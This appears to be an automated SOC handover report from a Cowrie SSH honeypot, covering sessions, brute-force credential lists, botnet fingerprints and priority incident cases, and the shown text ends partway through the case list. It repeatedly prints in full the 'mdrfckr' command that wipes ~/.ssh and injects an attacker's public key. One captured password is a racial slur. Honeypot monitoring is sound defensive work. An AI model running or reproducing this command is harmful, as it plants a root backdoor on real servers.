# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-05 |
| **Generated At** | 2026-06-05T16:31:53Z |
| **Shift Time** | 16:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **462** |
| Confirmed Threats | **406** |
| False Positives Filtered | **56** (12.1%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **17** |
| High Severity Cases | **124** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **338** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **313** |
| Unique Credential Pairs | **184** |
| Unique Usernames | **114** |
| Unique Passwords | **150** |
| Successful Auth Pairs | **75** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 124 |
| `345gs5662d34` | 62 |
| `admin` | 3 |
| `deploy` | 3 |
| `ubuntu` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 62 |
| `3245gs5662d34` | 62 |
| `123456` | 25 |
| `123` | 5 |
| `password` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 62 |
| `root` | `3245gs5662d34` | 62 |
| `caldera` | `caldera` | 2 |
| `root` | `ROOT` | 2 |
| `root` | `123qwe..` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin2018` | `41.111.178.165` | 2026-06-05T12:45:02 |
| `root` | `3245gs5662d34` | `41.111.178.165` | 2026-06-05T12:45:06 |
| `root` | `qwert123` | `41.111.178.165` | 2026-06-05T12:49:11 |
| `root` | `passroot123` | `41.111.178.165` | 2026-06-05T12:53:20 |
| `root` | `Smart@2025` | `41.111.178.165` | 2026-06-05T12:55:15 |
| `root` | `Admin001` | `41.111.178.165` | 2026-06-05T13:01:05 |
| `root` | `Pass123!@#` | `41.111.178.165` | 2026-06-05T13:03:39 |
| `root` | `Abcd123!@#` | `41.111.178.165` | 2026-06-05T13:05:36 |
| `root` | `nigger12` | `103.54.101.216` | 2026-06-05T13:08:35 |
| `root` | `3245gs5662d34` | `103.54.101.216` | 2026-06-05T13:08:37 |
| `root` | `Pp123456` | `41.111.178.165` | 2026-06-05T13:11:53 |
| `root` | `ZAQ!2wsx2026@` | `41.111.178.165` | 2026-06-05T13:15:48 |
| `root` | `hz123456` | `41.111.178.165` | 2026-06-05T13:18:20 |
| `root` | `root12345` | `41.111.178.165` | 2026-06-05T13:24:06 |
| `root` | `QQ@111111` | `81.30.212.94` | 2026-06-05T13:38:11 |
| `root` | `3245gs5662d34` | `81.30.212.94` | 2026-06-05T13:38:16 |
| `root` | `......` | `81.30.212.94` | 2026-06-05T13:39:46 |
| `root` | `71717171` | `81.30.212.94` | 2026-06-05T13:41:18 |
| `root` | `Ky123456.` | `81.30.212.94` | 2026-06-05T13:45:38 |
| `root` | `12345a@` | `81.30.212.94` | 2026-06-05T13:47:09 |
| `root` | `Admin2025!` | `81.30.212.94` | 2026-06-05T13:48:38 |
| `root` | `228228228` | `81.30.212.94` | 2026-06-05T13:51:37 |
| `root` | `q1w2e3!@#` | `81.30.212.94` | 2026-06-05T13:54:43 |
| `root` | `123123qwe` | `81.30.212.94` | 2026-06-05T14:02:02 |
| `root` | `Js123456` | `81.30.212.94` | 2026-06-05T14:03:33 |
| `root` | `Ubuntu2023` | `81.30.212.94` | 2026-06-05T14:05:06 |
| `root` | `Abc123456!` | `81.30.212.94` | 2026-06-05T14:06:40 |
| `root` | `P@ssw0rd!!!` | `81.30.212.94` | 2026-06-05T14:14:10 |
| `root` | `zaq1xsw2cde3` | `202.70.78.237` | 2026-06-05T14:28:13 |
| `root` | `3245gs5662d34` | `202.70.78.237` | 2026-06-05T14:28:15 |
| `root` | `server` | `34.71.30.159` | 2026-06-05T14:46:22 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-06-05T14:46:28 |
| `root` | `opengate` | `156.245.144.121` | 2026-06-05T15:32:34 |
| `root` | `3245gs5662d34` | `156.245.144.121` | 2026-06-05T15:32:37 |
| `root` | `admin2024` | `156.245.144.121` | 2026-06-05T15:38:27 |
| `root` | `Admin1` | `203.205.37.233` | 2026-06-05T15:41:26 |
| `root` | `3245gs5662d34` | `203.205.37.233` | 2026-06-05T15:41:31 |
| `root` | `zw@123456` | `156.245.144.121` | 2026-06-05T15:44:12 |
| `root` | `12345678qwe` | `156.245.144.121` | 2026-06-05T15:56:07 |
| `root` | `w` | `203.205.37.233` | 2026-06-05T15:59:52 |
| `root` | `Wx123456` | `203.205.37.233` | 2026-06-05T16:02:30 |
| `root` | `Sonu@123` | `156.245.144.121` | 2026-06-05T16:03:55 |
| `root` | `killer` | `203.205.37.233` | 2026-06-05T16:05:33 |
| `root` | `ROOT` | `194.74.196.10` | 2026-06-05T16:06:48 |
| `root` | `3245gs5662d34` | `194.74.196.10` | 2026-06-05T16:06:52 |
| `root` | `dktkekf#$` | `203.205.37.233` | 2026-06-05T16:06:56 |
| `root` | `Qwerty@2025` | `156.245.144.121` | 2026-06-05T16:09:58 |
| `root` | `ROOT` | `82.208.20.10` | 2026-06-05T16:10:05 |
| `root` | `3245gs5662d34` | `82.208.20.10` | 2026-06-05T16:10:13 |
| `root` | `235689` | `156.245.144.121` | 2026-06-05T16:11:55 |
| `root` | `123qwe..` | `103.180.213.153` | 2026-06-05T16:14:10 |
| `root` | `3245gs5662d34` | `103.180.213.153` | 2026-06-05T16:14:11 |
| `root` | `Pa55word` | `107.174.82.77` | 2026-06-05T16:17:52 |
| `root` | `3245gs5662d34` | `107.174.82.77` | 2026-06-05T16:17:59 |
| `root` | `Root@2023` | `156.245.144.121` | 2026-06-05T16:19:49 |
| `root` | `Zxcvbn123` | `107.174.82.77` | 2026-06-05T16:19:58 |
| `root` | `1A2b3c4d` | `107.174.82.77` | 2026-06-05T16:20:22 |
| `root` | `1qaz2wsx123` | `47.79.124.231` | 2026-06-05T16:21:38 |
| `root` | `3245gs5662d34` | `47.79.124.231` | 2026-06-05T16:21:40 |
| `root` | `@qwer2025` | `47.79.124.231` | 2026-06-05T16:22:28 |
| `root` | `P@ssw0rd!` | `107.174.82.77` | 2026-06-05T16:23:02 |
| `root` | `1235` | `156.245.144.121` | 2026-06-05T16:23:46 |
| `root` | `Qwe123321` | `47.93.199.81` | 2026-06-05T16:25:19 |
| `root` | `Root@2022` | `107.174.82.77` | 2026-06-05T16:25:23 |
| `root` | `3245gs5662d34` | `47.93.199.81` | 2026-06-05T16:25:23 |
| `root` | `1qwe` | `156.245.144.121` | 2026-06-05T16:25:46 |
| `root` | `Hn123456` | `107.174.82.77` | 2026-06-05T16:26:30 |
| `root` | `123qwe..` | `47.93.199.81` | 2026-06-05T16:26:35 |
| `root` | `mestre` | `107.174.82.77` | 2026-06-05T16:27:31 |
| `root` | `Password88` | `47.93.199.81` | 2026-06-05T16:27:47 |
| `root` | `admin_2026` | `107.174.82.77` | 2026-06-05T16:28:15 |
| `root` | `1qaz2wsx123` | `47.93.199.81` | 2026-06-05T16:28:24 |
| `root` | `Ff123456` | `107.174.82.77` | 2026-06-05T16:28:49 |
| `root` | `abcd.1234` | `107.174.82.77` | 2026-06-05T16:29:29 |
| `root` | `@qwer2025` | `47.93.199.81` | 2026-06-05T16:30:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **462** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 328 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 291 | 18 |
| `af8223ac9914...` | libssh-based | 31 | 1 |
| `03a80b21afa8...` | Modern SSH client | 4 | 4 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 291 | 18 | Mirai/variant |
| `af8223ac9914...` | libssh | 31 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 4 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 62 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.54.101.216`, `34.71.30.159`, `47.93.199.81`, `81.30.212.94`, `107.174.82.77`, `103.180.213.153`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **32** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS26496` | GoDaddy.com, LLC | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS51167` | Contabo GmbH | 1 | HIGH |
| `AS58519` | Cloud Computing Corporation | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (114)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ac84de28d14a

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:45 |
| **Last Seen** | 2026-06-05 12:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:45:02` | `cowrie.session.connect` |
| `2026-06-05 12:45:02` | `cowrie.client.version` |
| `2026-06-05 12:45:02` | `cowrie.client.kex` |
| `2026-06-05 12:45:02` | `cowrie.login.success` |
| `2026-06-05 12:45:03` | `cowrie.session.params` |
| `2026-06-05 12:45:03` | `cowrie.command.input` |
| `2026-06-05 12:45:03` | `cowrie.command.failed` |
| `2026-06-05 12:45:03` | `cowrie.log.closed` |
| `2026-06-05 12:45:03` | `cowrie.session.params` |
| `2026-06-05 12:45:03` | `cowrie.command.input` |
| `2026-06-05 12:45:03` | `cowrie.session.file_download` |
| `2026-06-05 12:45:03` | `cowrie.log.closed` |
| `2026-06-05 12:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc5a6ee686d

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:45 |
| **Last Seen** | 2026-06-05 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:45:06` | `cowrie.session.connect` |
| `2026-06-05 12:45:06` | `cowrie.client.version` |
| `2026-06-05 12:45:06` | `cowrie.client.kex` |
| `2026-06-05 12:45:06` | `cowrie.login.success` |
| `2026-06-05 12:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5109aaf8729f

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:49 |
| **Last Seen** | 2026-06-05 12:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:49:10` | `cowrie.session.connect` |
| `2026-06-05 12:49:10` | `cowrie.client.version` |
| `2026-06-05 12:49:11` | `cowrie.client.kex` |
| `2026-06-05 12:49:11` | `cowrie.login.success` |
| `2026-06-05 12:49:12` | `cowrie.session.params` |
| `2026-06-05 12:49:12` | `cowrie.command.input` |
| `2026-06-05 12:49:12` | `cowrie.command.failed` |
| `2026-06-05 12:49:12` | `cowrie.log.closed` |
| `2026-06-05 12:49:12` | `cowrie.session.params` |
| `2026-06-05 12:49:12` | `cowrie.command.input` |
| `2026-06-05 12:49:12` | `cowrie.session.file_download` |
| `2026-06-05 12:49:12` | `cowrie.log.closed` |
| `2026-06-05 12:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9fed9b0a38c

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:49 |
| **Last Seen** | 2026-06-05 12:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:49:14` | `cowrie.session.connect` |
| `2026-06-05 12:49:14` | `cowrie.client.version` |
| `2026-06-05 12:49:14` | `cowrie.client.kex` |
| `2026-06-05 12:49:15` | `cowrie.login.success` |
| `2026-06-05 12:49:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2f97e43c94d

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:53 |
| **Last Seen** | 2026-06-05 12:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:53:20` | `cowrie.session.connect` |
| `2026-06-05 12:53:20` | `cowrie.client.version` |
| `2026-06-05 12:53:20` | `cowrie.client.kex` |
| `2026-06-05 12:53:20` | `cowrie.login.success` |
| `2026-06-05 12:53:21` | `cowrie.session.params` |
| `2026-06-05 12:53:21` | `cowrie.command.input` |
| `2026-06-05 12:53:21` | `cowrie.command.failed` |
| `2026-06-05 12:53:21` | `cowrie.log.closed` |
| `2026-06-05 12:53:21` | `cowrie.session.params` |
| `2026-06-05 12:53:21` | `cowrie.command.input` |
| `2026-06-05 12:53:21` | `cowrie.session.file_download` |
| `2026-06-05 12:53:21` | `cowrie.log.closed` |
| `2026-06-05 12:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba381da7e3e0

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:53 |
| **Last Seen** | 2026-06-05 12:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:53:23` | `cowrie.session.connect` |
| `2026-06-05 12:53:23` | `cowrie.client.version` |
| `2026-06-05 12:53:23` | `cowrie.client.kex` |
| `2026-06-05 12:53:24` | `cowrie.login.success` |
| `2026-06-05 12:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0ec0ef7b4af

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:55 |
| **Last Seen** | 2026-06-05 12:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:55:15` | `cowrie.session.connect` |
| `2026-06-05 12:55:15` | `cowrie.client.version` |
| `2026-06-05 12:55:15` | `cowrie.client.kex` |
| `2026-06-05 12:55:15` | `cowrie.login.success` |
| `2026-06-05 12:55:16` | `cowrie.session.params` |
| `2026-06-05 12:55:16` | `cowrie.command.input` |
| `2026-06-05 12:55:16` | `cowrie.command.failed` |
| `2026-06-05 12:55:16` | `cowrie.log.closed` |
| `2026-06-05 12:55:16` | `cowrie.session.params` |
| `2026-06-05 12:55:16` | `cowrie.command.input` |
| `2026-06-05 12:55:16` | `cowrie.session.file_download` |
| `2026-06-05 12:55:16` | `cowrie.log.closed` |
| `2026-06-05 12:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e61a7682653b

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 12:55 |
| **Last Seen** | 2026-06-05 12:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 12:55:18` | `cowrie.session.connect` |
| `2026-06-05 12:55:18` | `cowrie.client.version` |
| `2026-06-05 12:55:19` | `cowrie.client.kex` |
| `2026-06-05 12:55:19` | `cowrie.login.success` |
| `2026-06-05 12:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8012e914b48

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:01 |
| **Last Seen** | 2026-06-05 13:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:01:04` | `cowrie.session.connect` |
| `2026-06-05 13:01:04` | `cowrie.client.version` |
| `2026-06-05 13:01:04` | `cowrie.client.kex` |
| `2026-06-05 13:01:05` | `cowrie.login.success` |
| `2026-06-05 13:01:05` | `cowrie.session.params` |
| `2026-06-05 13:01:05` | `cowrie.command.input` |
| `2026-06-05 13:01:05` | `cowrie.command.failed` |
| `2026-06-05 13:01:05` | `cowrie.log.closed` |
| `2026-06-05 13:01:06` | `cowrie.session.params` |
| `2026-06-05 13:01:06` | `cowrie.command.input` |
| `2026-06-05 13:01:06` | `cowrie.session.file_download` |
| `2026-06-05 13:01:06` | `cowrie.log.closed` |
| `2026-06-05 13:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43d3e9ec1e5a

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:01 |
| **Last Seen** | 2026-06-05 13:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 13:01:08` | `cowrie.session.connect` |
| `2026-06-05 13:01:08` | `cowrie.client.version` |
| `2026-06-05 13:01:08` | `cowrie.client.kex` |
| `2026-06-05 13:01:08` | `cowrie.login.success` |
| `2026-06-05 13:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.111.178[.]165` to AbuseIPDB if not already reported
- [ ] Block `41.111.178[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510b411cab52

| Field | Detail |
|---|---|
| **Source IP** | `41.111.178[.]165` |
| **First Seen** | 2026-06-05 13:03 |
| **Last Seen** | 2026-06-05 13:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
